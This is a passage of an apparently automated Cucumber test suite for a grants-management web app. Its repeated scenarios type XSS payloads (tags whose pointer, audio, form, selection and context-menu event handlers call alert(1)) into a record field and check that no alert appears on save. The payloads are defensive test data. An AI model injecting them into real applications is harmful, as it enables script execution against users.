      | Value                                                     | Field                |
      | <xss onpointerdown=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300853 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onpointerenter=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300854 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onpointerleave=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300855 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xss onpointermove=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300856 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300857 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xss onpointerover=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300858 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <xss onpointerrawupdate=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300859 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <xss onpointerup=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300860 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300861 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <form onreset=alert(1)><input type=reset> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300862 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <form><input type=search onsearch=alert(1) value="Hit return" autofocus> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300863 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300864 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                              | Field                |
      | <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300865 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                           | Field                |
      | <input onselect=alert(1) value="XSS" autofocus> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300866 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | <body onselectionchange=alert(1)>select some text | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300867 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | <body onselectstart=alert(1)>select some text | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300868 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                      | Field                |
      | <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300869 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                       | Field                |
